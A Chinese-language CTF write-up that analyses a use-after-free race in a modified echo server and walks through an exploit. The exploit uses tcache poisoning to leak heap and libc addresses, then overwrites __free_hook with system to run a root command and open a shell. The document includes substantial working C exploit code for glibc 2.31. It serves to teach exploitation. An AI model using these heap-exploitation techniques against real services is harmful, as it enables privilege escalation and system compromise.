## 一、题目分析

附件提供了三个文件，通过查看题目代码可以知道：echo_server用来监听本机的一个端口，题目要求我们传入一个elf文件，之后会将读的文件执行起来，需要用传入的文件来和服务做一个交互。

其实就是魔改了一下回声服务器：https://blog.csdn.net/hanqing280441589/article/details/44259939  （可以看看这个博客了解一下）

## 二、漏洞分析

```    write(c1, "a", 0x20);    write(c2, "b", 0x20);    usleep(1000)();        write(c2, "c", 4);    close(c1);
```

我们将题目提供的源码用asan编译一下可以看到uaf漏洞的产生：

![](./img/1.png)

我们加入一些puts和getchar分析一下：

如果我们将write和close用getchar分开，就可以保证正常的执行如下图：
![](./img/3.png)

去掉getchar可以看到：
![](./img/4.png)

很明显可以看到正常流程为先完成三次read，之后执行close，但是现在close抢在第三次read之前执行，导致了uaf。
我们去调试一下：
cf00位置是fd：04，后面是存放字符串的chunk指针
![](./img/7.png)
析构后，原04的位置复制为了05和其对应的chunk指针
![](./img/8.png)
但是之后read依旧找旧05的位置，此时他的chunk为已free的原04的chunk。
![](./img/9.png)
调试了一下析构的过程发现它会将两个fd的chunk指针交换。


## 写exp (主要参考了http://blog.redrocket.club/2020/08/30/google-ctf-quals-2020-echo/  ，简单调了调)

libc版本：glibc2.31

#### 1、leak

###### leak heap

- 泄漏heap的地址主要依靠glibc2.29引入的key指针，我们都知道它指向堆开头的tcache_perthread_struct结构的地址，我们将他泄漏就可以得到堆基址。

准备阶段：

- 申请0x10000大小的大chunk（主要保证之后低地址覆盖时可以正好落入大chunk）
- 申请小chunk
- 将其中一个free进入tcache
- 之后利用uaf低字节修改tcache fd，目的是下次分配之后，key值就会落入准备好的0x1000中
- 输出大chunk，在里面查找key值，即可泄漏出heap基地址

低字节修改后：

![](./img/5.png)

key值落入0x10000大chunk

![](./img/6.png)

```
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    yield();
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();

    // close A buffer, places pointer to it in tcache freelist head
    close(conns[13]);
    yield();

    // bug: free B, and auf write two nullbytes into free'd B memory.
    // partially overwrites tcaches next pointer pointing to A.
    write(conns[15], "\0", 1);
    close(conns[14]);
    yield();

    // allocate two 0x30 chunks, Y is likely to be placed inside the 0x10000 area
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    yield();

    // free Y chunk, writes heap base into 0x10000 area
    close(conns[14]);
    yield();

    // read the buffer back in by sending '\n'
    write(conns[0], "\n", 1);
    // skip the hello message, linus would insult me for writing this code
    do {
        read(conns[0], chunk, 1);
    } while(*chunk != '\n');
    readall(conns[0], chunk, 0x10000);

    // search for heap address
    size_t *leak = memmem(chunk, 0x10000, "YYYYYYYY", 8);
    if (!leak) {
        puts("heapbase not found :(");
        exit(0);
    }
    size_t heapbase = leak[-1];
    printf("heapbase located at: 0x%lx\n", heapbase);
```


###### leak libc

- 构造0x30的chunk覆盖到0x810大小的chunk的位置
![](./img/10.png)
![](./img/11.png)
通过write（‘\n’）free掉0x810的chunk
![](./img/12.png)
这样可以泄漏libc基址了

```
close(conns[15]);
    close(conns[13]);
    yield();
    conns[13] = conn();
    yield();
    conns[14] = conn();
    yield();
    conns[15] = conn();
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(conns[13]);
    yield();

    // bug again: overwrite tcache pointer
    size_t addr = heapbase + OFFSET_HEAP;
    write(conns[15], &addr, 7);
    close(conns[14]);
    yield();

    // allocates fake chunk over filler chunk 5's header
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    ((size_t*)chunk)[0] = 0;
    ((size_t*)chunk)[1] = 0x811;
    ((size_t*)chunk)[2] = 0;
    ((size_t*)chunk)[3] = 0;
    write(conns[14], chunk, 0x20);
    yield();

    // free chunk 5
    write(conns[5], "\n", 1);
    yield();

    // trigger a realloc (because heap is overlapping, this will lead to problems) and send leaked data out
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n", 0x40);
    yield();

    // read in the libc leak
    do {
        read(conns[14], chunk, 1);
    } while(*chunk != '\n');
    read(conns[14], chunk, 0x20);
    leak = (size_t*)chunk;
    if (leak[1] == 0x811) {
        puts("libc leak not found :(");
        exit(0);
    }
    printf("leaked: %lx %lx %lx %lx\n", leak[0], leak[1], leak[2], leak[3]);
    size_t libcbase = leak[2] -= OFFSET_LIBC;
    printf("libc located at: 0x%lx\n", libcbase);

```

###### get shell

修改free_hook 很常规

```
    int x, y, z;
    x = conn();
    yield();
    y = conn();
    yield();
    z = conn();
    yield();
    write(x, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(y, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(z, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(x);
    yield();

    // bug again: overwrite tcache pointer to point at free hook
    addr = libcbase + OFFSET_FREE_HOOK;
    write(z, &addr, 7);
    close(y);
    yield();

    // get chunk overlapping the free hook, overwrite it with system
    write(conns[10], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    memset(chunk, 0, 0x20);
    *(size_t*)chunk = libcbase + OFFSET_SYSTEM;
    write(conns[11], chunk, 0x20);
    yield();

    // create chunk with command to be executed
    x = conn();
    write(x, "/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0", 0x50);
    // free the chunk, executes the command as root
    close(x);

    // we can now cat /tmp/flag
    fflush(stdout);
    system("/bin/sh");
    return 0;
```

![](./img/13.png)






